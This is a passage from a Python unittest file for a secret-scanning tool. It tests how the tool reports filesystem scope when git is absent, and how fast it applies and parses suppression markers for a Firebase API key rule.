        self.assertEqual("tool.target-symlink", root_report["tool_errors"][0]["code"])

    def test_req_010_non_git_directory_has_honest_filesystem_scope(self) -> None:
        fixture = RepositoryFixture(self, git=False)
        fixture.write("README.md", "ordinary\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertEqual("filesystem", report["scope"]["mode"])
        self.assertFalse(report["scope"]["git_history_scanned"])
        self.assertEqual("none", report["release_assertion"])

    def test_req_010_missing_git_uses_honest_filesystem_fallback(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "ordinary\n")
        environment = os.environ.copy()
        environment["PATH"] = ""
        environment["PYTHONDONTWRITEBYTECODE"] = "1"

        completed = subprocess.run(
            [sys.executable, str(SCANNER), str(fixture.root), "--format", "json"],
            cwd=REPOSITORY_ROOT,
            env=environment,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
            timeout=20,
        )

        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertEqual("filesystem", report["scope"]["mode"])
        self.assertEqual(["regular-files"], report["scope"]["includes"])
        self.assertFalse(report["scope"]["git_history_scanned"])

    def test_req_011_suppression_application_is_bounded(self) -> None:
        scanner = load_scanner_module()
        count = 12_000
        metadata = (
            'reason="reviewed" owner="app" approved-by="security" '
            'compensating-control="deny rules" expires="2099-01-01"'
        )
        marker = f"vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY {metadata}"
        findings = [
            scanner.Finding(
                "VW-FIREBASE-PUBLIC-API-KEY",
                "config.js",
                line,
                source_id=b"config.js",
            )
            for line in range(1, count + 1)
        ]
        source = "\n".join(marker for _ in range(count)) + "\n"

        started = time.perf_counter()
        scanner._apply_suppressions(findings, {b"config.js": source})
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 3.0, f"suppression application took {elapsed:.3f}s")
        self.assertTrue(all(finding.suppressed for finding in findings))

    def test_req_011_suppression_metadata_parser_has_a_hard_budget(self) -> None:
        scanner = load_scanner_module()
        line = 'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="' + ("x" * 50_000)

        started = time.perf_counter()
        parsed = scanner._parse_suppression(line)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 0.5, f"suppression parse took {elapsed:.3f}s")
        self.assertEqual(("VW-FIREBASE-PUBLIC-API-KEY", {}), parsed)


if __name__ == "__main__":
    unittest.main()
